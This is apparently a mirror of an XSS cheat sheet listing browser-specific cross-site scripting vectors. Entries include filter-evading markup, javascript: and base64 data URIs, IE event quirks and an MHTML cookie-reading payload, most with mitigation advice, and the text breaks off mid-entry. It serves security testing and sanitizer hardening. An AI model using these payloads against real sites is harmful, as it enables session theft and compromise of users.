<p>reporter：LeverOne</p>
<h3 id="Plaintext_tags_used_for_markup_obfuscation#40test">Plaintext tags used for markup obfuscation<a href="#40">#40</a><a href="test/#40">test</a></h3><p>This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image’s “src” attribute and accept the incoming data.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;style&#62;&#60;img src=&#34;&#60;/style&#62;&#60;img src=x onerror=alert(1)//&#34;&#62;</span><br></pre></td></tr></table></figure>
<p>Don’t rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.</p>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 8.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>plaintext</li>
<li>tags</li>
<li>parsing</li>
<li>attributes</li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="Error_handler_via_empty_list-style_and_load_handler_via_empty_content#41test">Error handler via empty list-style and load handler via empty content<a href="#41">#41</a><a href="test/#41">test</a></h3><p>Opera 10.5+ and earlier versions fire an error event for &lt;LI&gt; tags in case the background URL via style attribute cannot be loaded. The same works with “list-style-image” too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg), but at the moment it is sensitive to events and &lt;script&gt; tags before and after.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;li style=list-style:url() onerror=alert(1)&#62;&#60;/li&#62; &#60;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&#62;&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>css</li>
<li>background</li>
<li>opera</li>
<li>onerror</li>
<li>content</li>
</ul>
<p>reporter：LeverOne, .mario</p>
<h3 id="Link_hijacking_via_&lt;BASE&gt;_and_JavaScript_URI#42test">Link hijacking via &lt;BASE&gt; and JavaScript URI<a href="#42">#42</a><a href="test/#42">test</a></h3><p>&lt;BASE&gt; link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents. Opera 11 ships a more or less working fix, but this problem continues to exist in difficult to exploit forms though.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;head&#62;&#60;base href=&#34;javascript://&#34;/&#62;&#60;/head&#62;&#60;body&#62;&#60;a href=&#34;/. /,alert(1)//#&#34;&#62;XXX&#60;/a&#62;&#60;/body&#62;</span><br></pre></td></tr></table></figure>
<p>User submitted HTML should not allow usage of &lt;BASE&gt; tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera 10.63</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari 5.1.7</p>
</li>
<li><p>internet explorer 5.5</p>
</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>internet explorer</li>
<li>base</li>
<li>hijacking</li>
</ul>
<p>reporter：brainpillow, Gareth, .mario</p>
<h3 id="JavaScript_execution_via_&lt;SCRIPT&gt;_for_and_event_attributes#48test">JavaScript execution via &lt;SCRIPT&gt; for and event attributes<a href="#48">#48</a><a href="test/#48">test</a></h3><p>Internet Explorer allow using &lt;SCRIPT&gt; tags with “for” and “event” attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction. Opera simply ignores these attributes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;SCRIPT FOR=document EVENT=onreadystatechange&#62;alert(1)&#60;/SCRIPT&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.0</li>
<li><p>opera 12.0</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>for</li>
<li>event</li>
<li>internet explorer</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;OBJECT&gt;_DataURL_attribute#49test">JavaScript execution via &lt;OBJECT&gt; DataURL attribute<a href="#49">#49</a><a href="test/#49">test</a></h3><p>Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the “dataurl” attribute of a TDC Object. The JavaScript will be executed without user any interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;OBJECT CLASSID=&#34;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&#34;&#62;&#60;PARAM NAME=&#34;DataURL&#34; VALUE=&#34;javascript:alert(1)&#34;&#62;&#60;/OBJECT&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>object</li>
<li>dataurl</li>
<li><p>TDC</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;OBJECT&gt;_data#50test">JavaScript execution via &lt;OBJECT&gt; data<a href="#50">#50</a><a href="test/#50">test</a></h3><p>Almost all browsers supporting data URIs allow executing JavaScript via crafted &lt;OBJECT&gt; “data” attribute value - even if base64 encoded. Note however, that different browsers execute the JavaScript on different origins. Firefox for instance will execute on the hosting domain and thus allow XSS, while Chrome will execute on about:blank.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;object data=&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;&#62;&#60;/object&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure user submitted HTML cannot contain &lt;OBJECT&gt; tags or only whitelisted &lt;OBJECT&gt; “data” values.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>chrome</li>
<li>embed</li>
<li>safari</li>
<li>src</li>
<li>firefox</li>
<li>base64</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;EMBED&gt;_src#51test">JavaScript execution via &lt;EMBED&gt; src<a href="#51">#51</a><a href="test/#51">test</a></h3><p>Almost all browsers supporting data URIs allow executing JavaScript via crafted &lt;EMBED&gt; “src” attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;embed src=&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;&#62;&#60;/embed&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure user submitted HTML cannot contain &lt;EMBED&gt; tags or only whitelisted &lt;EMBED&gt; “src” values.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>chrome</li>
<li>embed</li>
<li>safari</li>
<li>src</li>
<li>base64</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Tags_nested_in_other_tags_to_trick_filters#57test">Tags nested in other tags to trick filters<a href="#57">#57</a><a href="test/#57">test</a></h3><p>Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn’t.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;b &#60;script&#62;alert(1)//&#60;/script&#62;0&#60;/script&#62;&#60;/b&#62;</span><br></pre></td></tr></table></figure>
<p>This vector is ideal to trick regular expression based HTML filters and sanitizers. Make sure your filters are aware of the fact that some user agents evaluate &lt;b &lt;script&gt; while others will prefer &lt;b&gt;&lt;script&gt;.</p>
<ul>
<li>firefox 3.5</li>
<li><p>firefox 3.6.28</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome 5.0</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari 4.0.3</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>nesting</li>
<li>script</li>
<li>parser</li>
<li>regex</li>
</ul>
<p>reporter：.mario, Kyo, sirdarckcat</p>
<h3 id="XSS_using_accent_grave_when_copying_innerHTML_(1)#59test">XSS using accent grave when copying innerHTML (1)<a href="#59">#59</a><a href="test/#59">test</a></h3><p>Internet Explorer treats the accent grave (`) as an attribute delimiter like “ and ‘. The quotation mark (“) will be stripped from the attribute value when using the innerHTML property in case it doesn’t contain space.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div id=&#34;div1&#34;&#62;&#60;input value=&#34;``onmouseover=alert(1)&#34;&#62;&#60;/div&#62; &#60;div id=&#34;div2&#34;&#62;&#60;/div&#62;&#60;script&#62;document.getElementById(&#34;div2&#34;).innerHTML = document.getElementById(&#34;div1&#34;).innerHTML;&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja). Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it’s supposed to.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 8.0 (unpatched)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>script</li>
<li>dom</li>
<li><p>innerhtml</p>
</li>
<li><p><a href="#97">#97</a></p>
</li>
<li><a href="#98">#98</a></li>
<li><a href="#128">#128</a></li>
</ul>
<p>reporter：hasegawayosuke</p>
<h3 id="Simulating_attributes_in_IE#62test">Simulating attributes in IE<a href="#62">#62</a><a href="test/#62">test</a></h3><p>This vector simulates an attribute in IE by using a single quote to trick filters. This works up to IE9 in standards mode and in latest IE using older document modes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- IE 6-8 --&#62; &#60;x &#39;=&#34;foo&#34;&#62;&#60;x foo=&#39;&#62;&#60;img src=x onerror=alert(1)//&#39;&#62; &#60;!-- IE 6-9 --&#62; &#60;! &#39;=&#34;foo&#34;&#62;&#60;x foo=&#39;&#62;&#60;img src=x onerror=alert(2)//&#39;&#62; &#60;? &#39;=&#34;foo&#34;&#62;&#60;x foo=&#39;&#62;&#60;img src=x onerror=alert(3)//&#39;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>attribute</li>
<li>simulating</li>
<li>parser</li>
<li><p>regex</p>
</li>
<li><p><a href="#102">#102</a></p>
</li>
<li><a href="#108">#108</a></li>
<li><a href="#133">#133</a></li>
</ul>
<p>reporter：Algol, jackmasa, LeverOne, White Jordan</p>
<h3 id="JavaScript_execution_via_src_attribute#63test">JavaScript execution via src attribute<a href="#63">#63</a><a href="test/#63">test</a></h3><p>Most browsers allow executing JavaScript via &lt;IFRAME&gt; “src” attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the &lt;EMBED&gt; tag while Opera 10 and Opera Mobile even execute JavaScript with &lt;SCRIPT&gt;, &lt;IMG&gt; and &lt;IMAGE&gt; and a matching “src” attribute as well as early Internet Explorer versions.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;embed src=&#34;javascript:alert(1)&#34;&#62;&#60;/embed&#62; // O10.10&#8595;, OM10.0&#8595;, GC6&#8595;, FF &#60;img src=&#34;javascript:alert(2)&#34;&#62; &#60;image src=&#34;javascript:alert(2)&#34;&#62; // IE6, O10.10&#8595;, OM10.0&#8595; &#60;script src=&#34;javascript:alert(3)&#34;&#62;&#60;/script&#62; // IE6, O11.01&#8595;, OM10.1&#8595;</span><br></pre></td></tr></table></figure>
<p>Make sure “src” attributes can never contain non-HTTP-URLs to prevent XSS or worse.</p>
<ul>
<li>firefox 3.0</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 4.0</p>
</li>
<li><p>chrome 6.0</p>
</li>
<li><p>opera 8.x</p>
</li>
<li><p>opera 11.01</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>src</li>
<li>safari</li>
<li>chrome</li>
<li>opera</li>
<li>firefox</li>
<li>internet explorer</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_IE_filters_and_onfilterchange#70test">JavaScript execution via IE filters and onfilterchange<a href="#70">#70</a><a href="test/#70">test</a></h3><p>In some situations it’s possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation. In compatibility mode to IE8+ you can use the property “-ms-filter”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=width:1px;filter:glow onfilterchange=alert(1)&#62;x&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 9.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>filter</li>
<li>css</li>
<li>style</li>
<li>onfilterchange</li>
<li><p>internet explorer</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx</a></p>
</li>
<li><a href="http://msdn.microsoft.com/en-us/library/ie/hh801215(v=vs.85" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ie/hh801215(v=vs.85).aspx</a>.aspx)</li>
</ul>
<p>reporter：.mario</p>
<h3 id="&lt;OBJECT&gt;_tag_and_Flash_files_executing_JavaScript#79test">&lt;OBJECT&gt; tag and Flash files executing JavaScript<a href="#79">#79</a><a href="test/#79">test</a></h3><p>&lt;OBJECT&gt; tags directly including Flash files via the “data” attribute - allowing execution of JavaScript and more without user interaction.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;object allowscriptaccess=&#34;always&#34; data=&#34;test.swf&#34;&#62;&#60;/object&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure users cannot control the “src” and “data” attribute values of &lt;OBJECT&gt; tags - or better don’t whitelist &lt;OBJECT&gt; tags in user submitted markup at all.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class XSS &#123;public static function main() &#123; flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||&#34;javascript:alert(1)&#34;),flash.Lib._root.name||&#34;_top&#34;); &#125;&#125;crossdomain: 1path: [http://html5sec.org/test.swf](http://html5sec.org/test.swf)name: test.swf</span><br></pre></td></tr></table></figure>
<ul>
<li>safari 3.0</li>
<li><p>safari latest</p>
</li>
<li><p>firefox 1.5</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 10.0</p>
</li>
<li><p>opera 12.0</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>object</li>
<li>flash</li>
<li>swf</li>
<li>safari</li>
<li>firefox</li>
<li><p>opera</p>
</li>
<li><p><a href="http://www.w3.org/TR/REC-html40/struct/objects.html" target="_blank" rel="external">http://www.w3.org/TR/REC-html40/struct/objects.html</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Special_tags_parsing_issues#91test">Special tags parsing issues<a href="#91">#91</a><a href="test/#91">test</a></h3><p>The HTML tagnames start with a-zA-Z (abstracting from ignoring null byte from IE). In addition, there are other structures, parsed as a tag (special tags). They begin with the following characters: !,?, /,%. This has its reasons: DTD, comments, xml-declaration, import-instruction in Internet Explorer, closing tags etc. starts by these characters. These examples show that such tags will inherit some properties of their standard models. [A] Firefox, Opera, Google Chrome, Safari (4.0.4↑), IE 10↑ Standards mode: Parameters of the special tags can not contain a closing parenthesis “&gt;”. [B] Safari (up to 4.0.3): Parameter of the special tags can be broken only via “?&gt;”. [C] Opera (up to 11.52): Special tag inherits the properties of DTD: inside it you can create a section that starts with “[“ and ends with “]”. [D] IE 9↓ Standards mode, Safari (up to 4.0.3): A sequence like “&lt;% … %&gt;” is an alternative to comments. These features can be used for obfuscation and bypassing filters. And remember, do not parse as a tag in HTML structure like “&lt;è foo=…&gt;”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[A] &#60;? foo=&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62; &#60;! foo=&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62; &#60;/ foo=&#34;&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62; [B] &#60;? foo=&#34;&#62;&#60;x foo=&#39;?&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#39;&#62;&#34;&#62; [C] &#60;! foo=&#34;[[[x]]&#34;&#62;&#60;x foo=&#34;]foo&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62; [D] &#60;% foo&#62;&#60;x foo=&#34;%&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 8.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>tagname</li>
<li>internet explorer</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li>safari</li>
<li>parsing</li>
<li>breaking</li>
<li>obfuscation</li>
<li><p>closing tag</p>
</li>
<li><p><a href="http://sla.ckers.org/forum/read.php?2,15812,28148#msg-28148" target="_blank" rel="external">http://sla.ckers.org/forum/read.php?2,15812,28148#msg-28148</a></p>
</li>
<li><a href="#134">#134</a></li>
</ul>
<p>reporter：LeverOne, wpulog</p>
<h3 id="JavaScript_execution_via_MHTML-scheme#96test">JavaScript execution via MHTML-scheme<a href="#96">#96</a><a href="test/#96">test</a></h3><p>This example used the ability to convert the file with any conent type into a web archive using mhtml URI scheme to run JavaScript. For the first time this feature was discovered by Stepanishchev E. in 2006 and became known among web developers as an alternative to data URI for IE6-7. In 2007, Hasegawa Y. independently proposed a way to use this mhtml feature for XSS. Followed fix was incomplete because it doesn’t take into account the possibility of addressing to the contents of the archive using “!value”. This possibility as well as the possibility to access from the archive contents to a host domain are used in the example below. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line were vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web archives could be specified via &lt;IFRAME&gt; or location.href and comparable. This example was published in June 2010, fix released in April 2011. The mhtml URI scheme doesn’t determine the content type now, but archive contents still has access to the host domain.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe src=mhtml:http://html5sec.org/test.html!xss.html&#62;&#60;/iframe&#62; &#60;iframe src=mhtml:http://html5sec.org/test.gif!xss.html&#62;&#60;/iframe&#62;``&#60;html&#62; &#60;body&#62; &#60;b&#62;some content without two new line \n\n&#60;/b&#62; Content-Type: multipart/related; boundary=&#34;******&#34;&#60;b&#62;some content without two new line&#60;/b&#62; --****** Content-Location: xss.html Content-Transfer-Encoding: base64 PGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1 cmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9 dXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy YW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg --******-- &#60;/body&#62; &#60;/html&#62;crossdomain: 1path: [http://html5sec.org/test.html](http://html5sec.org/test.html)name: test.html</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>internet explorer</li>
<li>archive</li>
<li><p>mhtml</p>
</li>
<li><p><a href="http://en.wikipedia.org/wiki/MHTML" target="_blank" rel="external">http://en.wikipedia.org/wiki/MHTML</a></p>
</li>
<li><a href="http://bolknote.ru/2006/08/24/~312/" target="_blank" rel="external">http://bolknote.ru/2006/08/24/~312/</a></li>
<li><a href="http://openmya.hacker.jp/hasegawa/security/ms07-034.txt" target="_blank" rel="external">http://openmya.hacker.jp/hasegawa/security/ms07-034.txt</a></li>
<li><a href="http://www.microsoft.com/technet/security/advisory/2501696.mspx" target="_blank" rel="external">http://www.microsoft.com/technet/security/advisory/2501696.mspx</a></li>
<li><a href="http://technet.microsoft.com/security/bulletin/ms11-026" target="_blank" rel="external">http://technet.microsoft.com/security/bulletin/ms11-026</a></li>
</ul>
<p>reporter：Bolk, LeverOne</p>
<h3 id="XSS_using_“xmlns”_attribute_in_custom_tag_when_copying_innerHTML_(2)#97test">XSS using “xmlns” attribute in custom tag when copying innerHTML (2)<a href="#97">#97</a><a href="test/#97">test</a></h3><p>Internet Explorer incorrectly analyzes the attribute “xmlns” in custom tags when copying innerHTML - its value is being added to the tag &lt;?XML:NAMESPACE&gt; without any delimiters.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- IE 5-9 --&#62; &#60;div id=d&#62;&#60;x xmlns=&#34;&#62;&#60;iframe onload=alert(1)&#34;&#62;&#60;/div&#62; &#60;script&#62;d.innerHTML+=&#39;&#39;;&#60;/script&#62; &#60;!-- IE 10 in IE5-9 Standards mode --&#62; &#60;div id=d&#62;&#60;x xmlns=&#39;&#34;&#62;&#60;iframe onload=alert(2)//&#39;&#62;&#60;/div&#62; &#60;script&#62;d.innerHTML+=&#39;&#39;;&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p>Be very careful when handling user generated HTMl in the DOM later on. The innerHTML property does not always contain what it’s supposed to.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>script</li>
<li>dom</li>
<li><p>innerhtml</p>
</li>
<li><p><a href="#59">#59</a></p>
</li>
<li><a href="#98">#98</a></li>
<li><a href="#128">#128</a></li>
</ul>
<p>reporter：LeverOne</p>
<h3 id="HTML_separators_and_ignored_characters#100test">HTML separators and ignored characters<a href="#100">#100</a><a href="test/#100">test</a></h3><p>[a] Characters accepted as tag name/attribute separators. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32,47 Internet Explorer (5-9 SM): 11 [b] Characters ignored before attributes (and not accepted as parameter/attribute separators). Firefox, Internet Explorer, Safari, Google Chrome, Opera : 47 Internet Explorer (5-9 SM): 0<strong> [c] Characters ignored between attribute name and equals sign. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 0,11 [d] Characters accepted as parameter/attribute separators. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 11 [e] Characters ignored between equals sign and parameter. Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer (5-9 SM): 0,11 * Characters are given as decimal ASCII table index. </strong> There is a common rule that the unencoded null character does not exist for IE HTML parser.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;img[a][b]src=x[d]onerror[c]=[e]&#34;alert(1)&#34;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>firefox 4.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 5.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>internet explorer</li>
<li>firefox</li>
<li>opera</li>
<li>chrome</li>
<li>safari</li>
<li><p>separator</p>
</li>
<li><p><a href="http://shazzer.co.uk/vector/Characters-allowed-after-script" target="_blank" rel="external">http://shazzer.co.uk/vector/Characters-allowed-after-script</a></p>
</li>
<li><a href="http://shazzer.co.uk/vector/Attribute-separators" target="_blank" rel="external">http://shazzer.co.uk/vector/Attribute-separators</a></li>
<li><a href="http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name" target="_blank" rel="external">http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name</a></li>
<li><a href="http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name" target="_blank" rel="external">http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name</a></li>
<li><a href="http://shazzer.co.uk/vector/Quoteless-attributes-breaker" target="_blank" rel="external">http://shazzer.co.uk/vector/Quoteless-attributes-breaker</a></li>
<li><a href="http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg" target="_blank" rel="external">http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg</a></li>
<li><a href="#106">#106</a></li>
</ul>
<p>reporter：hasegawayosuke, .mario, RSnake,</p>
<h3 id="Characters_ignored_in_the_URI_scheme#101test">Characters ignored in the URI scheme<a href="#101">#101</a><a href="test/#101">test</a></h3><p>The following characters<em> are ignored in the URI sheme: [a] All mentioned browsers: 9,10,13,32 IE, GC, Safari, Opera: 11,12 IE, GC, Safari, FF 3.6.28↓: 8 IE, GC, Safari: 1-7,14-31 Opera: 160,5760,6158,8192-8202,8232,8233,8239,8287,12288 Opera 11.52↓: 6159 IE (5-9 SM): 0 [b],[c] IE, GC, Safari 4.0.3↓, FF 4-6, Opera 10.63↓: 9,10,13 GC 7↓, Safari 4.0.3↓: 1-8,11,12 IE (5-9 SM): 0 Safari 4.0.4↑, Opera 11↑, FF 7↑: nothing </em> Characters are given as decimal ASCII table index.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a href=&#34;[a]java[b]script[c]:alert(1)&#34;&#62;XXX&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest</p>
</li>
<li><p>firefox 4.0</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 10.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>chrome 5.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>script</li>
<li>chrome</li>
<li><p>safari</p>
</li>
<li><p><a href="http://shazzer.co.uk/vectors?search=protocol" target="_blank" rel="external">http://shazzer.co.uk/vectors?search=protocol</a></p>
</li>
</ul>
<p>reporter：Gareth, .mario, RSnake</p>
<h3 id="Forced_plaintext_via_unbalanced_quotes_in_Internet_Explorer#102test">Forced plaintext via unbalanced quotes in Internet Explorer<a href="#102">#102</a><a href="test/#102">test</a></h3><p>Internet Explorer treats any tag as plaintext in case the attribute delimiters are unbalanced - in this example caused by the <code> </code>. In unbalanced quotes appear inside or outside an attributes - preceded by an arbitrary character but the equals sign - the usage of HTML inside attributes is possible and the content will be rendered as regular HTML. The problem has been reported and will be taken care of in later versions of the Internet Explorer.</p>
